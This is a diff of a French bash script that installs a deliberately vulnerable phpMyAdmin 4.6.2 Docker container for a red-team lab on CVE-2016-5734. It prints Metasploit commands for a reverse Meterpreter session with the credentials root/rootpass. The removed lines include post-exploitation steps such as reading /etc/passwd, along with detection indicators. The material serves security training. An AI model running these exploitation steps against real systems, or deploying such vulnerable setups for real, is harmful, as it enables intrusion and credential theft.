@@ -1,199 +1,42 @@
 #!/bin/bash
-
-###############################################################################
-# Iron4Software Red Team Lab - phpMyAdmin 4.6.2 Docker
-# CVE-2016-5734 - preg_replace RCE
-# Exploitation: Metasploit exploit/multi/http/phpmyadmin_preg_replace
-###############################################################################
-
 set -e
 
-echo "========================================================"
-echo "  Iron4Software Lab - phpMyAdmin 4.6.2 Docker"
-echo "  CVE-2016-5734 (preg_replace RCE)"
-echo "========================================================"
-echo ""
-
-if [ "$EUID" -ne 0 ]; then 
-    echo "❌ Ce script doit être exécuté en tant que root (sudo)"
-    exit 1
-fi
-
-echo "[1/7] Vérification de Docker..."
-if ! command -v docker &> /dev/null; then
-    echo "⚠️  Docker non installé, installation..."
-    apt update -qq
-    apt install -y docker.io > /dev/null 2>&1
-    systemctl start docker
-    systemctl enable docker
-    echo "✅ Docker installé"
-else
-    echo "✅ Docker détecté"
-    systemctl start docker 2>/dev/null || true
-fi
-
-echo "[2/7] Arrêt et suppression de l'ancien container phpMyAdmin..."
+echo "[*] Nettoyage ancien container..."
 docker stop phpmyadmin-vuln 2>/dev/null || true
 docker rm phpmyadmin-vuln 2>/dev/null || true
-echo "✅ Ancien container supprimé"
 
-echo "[3/7] Vérification de MySQL/MariaDB sur l'hôte..."
-# Détecter MySQL existant pour Roundcube
-if systemctl is-active --quiet mysql || systemctl is-active --quiet mariadb; then
-    echo "✅ MySQL/MariaDB actif (utilisé par Roundcube)"
-    DB_HOST="host.docker.internal"
-elif pgrep -x mysqld > /dev/null || pgrep -x mariadbd > /dev/null; then
-    echo "✅ MySQL/MariaDB détecté en processus"
-    DB_HOST="host.docker.internal"
-else
-    echo "⚠️  Aucun MySQL détecté, création d'un container MySQL..."
-    DB_HOST="mysql_db"
-    
-    # Arrêter l'ancien container MySQL s'il existe
-    docker stop mysql_db 2>/dev/null || true
-    docker rm mysql_db 2>/dev/null || true
-    
-    # Lancer MySQL dans un container séparé
-    docker run -d \
-        --name mysql_db \
-        --restart unless-stopped \
-        -e MYSQL_ROOT_PASSWORD=rootpass \
-        -e MYSQL_DATABASE=phpmyadmin \
-        -e MYSQL_USER=admin \
-        -e MYSQL_PASSWORD=admin \
-        mysql:5.7 > /dev/null 2>&1 || true
-    
-    echo "✅ MySQL container créé"
-    echo "   Attente démarrage MySQL (15 secondes)..."
-    sleep 15
-fi
+echo "[*] Pull phpMyAdmin 4.6.2..."
+docker pull phpmyadmin/phpmyadmin:4.6.2
 
-echo "[4/7] Téléchargement de phpMyAdmin 4.6.2..."
-docker pull phpmyadmin/phpmyadmin:4.6.2 > /dev/null 2>&1
-echo "✅ Image phpMyAdmin 4.6.2 téléchargée"
-
-echo "[5/7] Lancement phpMyAdmin 4.6.2 vulnérable (CVE-2016-5734)..."
-
-# Déterminer le port (8080 par défaut)
-PORT=8080
-
-# Lancer phpMyAdmin 4.6.2
+echo "[*] Lancement phpMyAdmin 4.6.2..."
 docker run -d \
     --name phpmyadmin-vuln \
     --restart unless-stopped \
     --add-host=host.docker.internal:host-gateway \
-    -e PMA_HOST="${DB_HOST}" \
+    -e PMA_HOST=host.docker.internal \
     -e PMA_PORT=3306 \
-    -e PMA_ARBITRARY=1 \
-    -e UPLOAD_LIMIT=300M \
-    -p ${PORT}:80 \
+    -p 8080:80 \
     phpmyadmin/phpmyadmin:4.6.2
 
-if [ $? -eq 0 ]; then
-    echo "✅ phpMyAdmin 4.6.2 lancé"
-else
-    echo "❌ Erreur lors du lancement"
-    exit 1
-fi
-
-echo "[6/7] Attente du démarrage (15 secondes)..."
-sleep 15
-
-echo "[7/7] Vérification..."
-HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:${PORT}/ 2>/dev/null)
-
-SERVER_IP=$(hostname -I | awk '{print $1}')
+echo "[*] Attente 10 secondes..."
+sleep 10
 
 echo ""
-echo "========================================================"
-echo "  ✅ Installation terminée avec succès !"
-echo "========================================================"
+echo "========================================"
+docker ps | grep phpmyadmin
+echo "========================================"
+curl -I http://localhost:8080/ 2>/dev/null | head -5
+echo "========================================"
 echo ""
-echo "📊 Configuration :"
-echo "   Container      : phpmyadmin-vuln"
-echo "   Version        : phpMyAdmin 4.6.2 (VULNERABLE)"
-echo "   CVE            : CVE-2016-5734"
-echo "   Exploit        : preg_replace() RCE"
-echo "   Port           : $PORT"
-echo "   IP Serveur     : $SERVER_IP"
-echo ""
-echo "🌐 URLs d'accès :"
-echo "   Local          : http://localhost:${PORT}/"
-echo "   Réseau         : http://${SERVER_IP}:${PORT}/"
-echo "   Depuis Kali    : http://${SERVER_IP}:${PORT}/"
-echo ""
-echo "🔐 Credentials MySQL (testés) :"
-echo "   User: root"
-echo "   Pass: rootpass"
-echo ""
-
-if [ "$HTTP_CODE" = "200" ]; then
-    echo "✅ phpMyAdmin accessible (HTTP 200)"
-else
-    echo "⚠️  phpMyAdmin ne répond pas encore (HTTP $HTTP_CODE)"
-    echo "   Attendez 30 secondes et testez: curl http://localhost:${PORT}/"
-fi
-
-echo ""
-echo "🐳 Gestion du container :"
-echo "   Voir logs       : docker logs -f phpmyadmin-vuln"
-echo "   Arrêter         : docker stop phpmyadmin-vuln"
-echo "   Démarrer        : docker start phpmyadmin-vuln"
-echo "   Supprimer       : docker rm -f phpmyadmin-vuln"
-echo "   Redémarrer      : docker restart phpmyadmin-vuln"
-echo ""
-echo "========================================================"
-echo "  🔥 EXPLOITATION AVEC METASPLOIT"
-echo "========================================================"
-echo ""
-echo "🎯 CVE-2016-5734 : preg_replace() avec option /e"
-echo "   Cette vulnérabilité utilise la fonction preg_replace() de PHP"
-echo "   avec l'option /e (eval) pour exécuter du code arbitraire."
-echo ""
-echo "📝 Exploitation Metasploit (DEPUIS KALI) :"
+echo "[+] PRÊT ! Exploitation depuis Kali :"
 echo ""
 echo "msfconsole -q"
 echo "use exploit/multi/http/phpmyadmin_preg_replace"
-echo "set RHOSTS ${SERVER_IP}"
-echo "set RPORT ${PORT}"
+echo "set RHOSTS 192.168.1.250"
+echo "set RPORT 8080"
 echo "set USERNAME root"
 echo "set PASSWORD rootpass"
 echo "set LHOST 192.168.100.10"
 echo "set LPORT 4444"
-echo "check"
 echo "exploit"
-echo ""
-echo "🎯 Post-Exploitation :"
-echo "meterpreter> sysinfo"
-echo "meterpreter> getuid"
-echo "meterpreter> shell"
-echo "# cat /etc/passwd"
-echo "# whoami"
-echo ""
-echo "========================================================"
-echo "  📊 DÉTECTION AVEC SPLUNK (Logs à surveiller)"
-echo "========================================================"
-echo ""
-echo "🔍 Indicateurs d'attaque :"
-echo "   - Requêtes HTTP vers /import.php avec payload suspect"
-echo "   - Utilisation de preg_replace avec /e"
-echo "   - Connexions sortantes inhabituelles depuis le container"
-echo "   - Tentatives d'élévation de privilèges"
-echo ""
-echo "🛡️  Signature MITRE ATT&CK :"
-echo "   T1190 - Exploit Public-Facing Application"
-echo "   T1059 - Command and Scripting Interpreter"
-echo "   T1071 - Application Layer Protocol"
-echo ""
-echo "========================================================"
-echo "  🐳 phpMyAdmin 4.6.2 Docker - CVE-2016-5734 - PRÊT"
-echo "========================================================"
-echo ""
-echo "📚 Ressources :"
-echo "   CVE-2016-5734  : https://nvd.nist.gov/vuln/detail/CVE-2016-5734"
-echo "   Exploit-DB     : https://www.exploit-db.com/exploits/40185"
-echo "   MITRE ATT&CK   : T1190 (Exploit Public-Facing Application)"
-echo ""
-echo "⚠️  Note : Cet environnement est volontairement vulnérable"
-echo "            À utiliser UNIQUEMENT dans un environnement de lab isolé"
 echo ""
